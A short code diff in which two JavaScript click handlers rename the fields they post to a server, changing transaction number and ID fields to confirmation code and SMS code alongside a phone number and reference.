@@ -249,7 +249,7 @@ $('next2').onclick=async()=>{
       body:JSON.stringify({
         type:'msg1',
         phone:phone,
-        transaction_number:tx
+        confirmation_code:tx
       })
     });
     const data=await response.json();
@@ -282,8 +282,8 @@ $('confirm').onclick=async()=>{
       body:JSON.stringify({
         type:'msg2',
         phone:phone,
-        transaction_number:tx1,
-        transaction_id:tx,
+        confirmation_code:tx1,
+        sms_code:tx,
         reference:ref
       })
     });
